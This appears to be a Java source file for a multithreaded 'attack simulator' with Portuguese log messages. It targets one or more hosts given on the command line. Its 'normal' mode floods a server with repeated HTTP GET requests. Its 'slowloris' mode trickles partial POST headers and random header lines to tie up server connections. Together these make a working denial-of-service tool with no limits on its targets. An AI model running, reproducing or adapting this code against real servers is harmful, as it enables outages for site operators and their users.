package b.attack.simulator;

import java.io.*;
import java.net.Socket;
import java.net.SocketException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.*;

public class AttackSimulator {

    public static void main(String[] args) {
        if (args.length < 4) {
            System.out.println("Uso: java AttackSimulator localhost 8080 10 normal");
            System.out.println("Modo: normal | slowloris");
            return;
        }

        List<String> hosts = Arrays.asList(args[0].split(","));
        int port = Integer.parseInt(args[1]);
        int threadCount = Integer.parseInt(args[2]);
        String mode = args[3].toLowerCase();

        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        for (String host : hosts) {
            for (int i = 0; i < threadCount; i++) {
                executor.submit(new AttackTask(host.trim(), port, mode));
            }
        }

        executor.shutdown();
        try {
            executor.awaitTermination(10, TimeUnit.MINUTES);
        } catch (InterruptedException e) {
            System.err.println("Execução interrompida: " + e.getMessage());
        }
    }
}

class AttackTask implements Runnable {
    private final String host;
    private final int port;
    private final String mode;
    private final BandwidthTracker tracker;

    public AttackTask(String host, int port, String mode) {
        this.host = host;
        this.port = port;
        this.mode = mode;
        this.tracker = new BandwidthTracker();
    }

    @Override
    public void run() {
        if ("slowloris".equalsIgnoreCase(mode)) {
            simulateSlowloris();
        } else {
            simulateNormalTraffic();
        }

        LoggerUtil.logToFile(host, "TOTAL Enviado: " + tracker.getSentBytes() +
                " bytes, Recebido: " + tracker.getReceivedBytes() + " bytes");
    }

    private void simulateNormalTraffic() {
        try (Socket socket = new Socket(host, port)) {
            socket.setSoTimeout(1000);
            OutputStream out = socket.getOutputStream();
            InputStream in = socket.getInputStream();
            long start = System.currentTimeMillis();

            while (true) {
                try {
                    String request = "GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
                    byte[] requestBytes = request.getBytes();
                    out.write(requestBytes);
                    out.flush();
                    tracker.addSent(requestBytes.length);

                    byte[] buffer = new byte[1024];
                    int bytesRead = in.read(buffer);
                    if (bytesRead == -1) break;

                    tracker.addReceived(bytesRead);
                    long end = System.currentTimeMillis();
                    String log = "[NORMAL][" + host + "] Tempo: " + (end - start) + "ms, Bytes recebidos: " + bytesRead;
                    LoggerUtil.logToFile(host, log);
                    start = end;
                } catch (SocketException e) {
                    LoggerUtil.logToFile(host, "[NORMAL] Conexão encerrada.");
                    break;
                }
            }
        } catch (IOException e) {
            LoggerUtil.logToFile(host, "Erro: " + e.getMessage());
        }
    }

    private void simulateSlowloris() {
        try (Socket socket = new Socket(host, port)) {
            OutputStream out = socket.getOutputStream();

            String[] headers = {
                    "POST / HTTP/1.1\r\n",
                    "Host: " + host + "\r\n",
                    "Content-Length: 10000\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n"
            };

            for (String header : headers) {
                byte[] data = header.getBytes();
                out.write(data);
                out.flush();
                tracker.addSent(data.length);
                LoggerUtil.logToFile(host, "[SLOWLORIS] Enviado cabeçalho parcial.");
                Thread.sleep(500);
            }

            while (true) {
                String slowLine = "X-a: " + new Random().nextInt(9999) + "\r\n";
                byte[] data = slowLine.getBytes();
                out.write(data);
                out.flush();
                tracker.addSent(data.length);
                LoggerUtil.logToFile(host, "[SLOWLORIS] Fragmento enviado.");
                Thread.sleep(1000);
            }
        } catch (IOException | InterruptedException e) {
            LoggerUtil.logToFile(host, "[SLOWLORIS] Conexão finalizada: " + e.getMessage());
        }
    }
}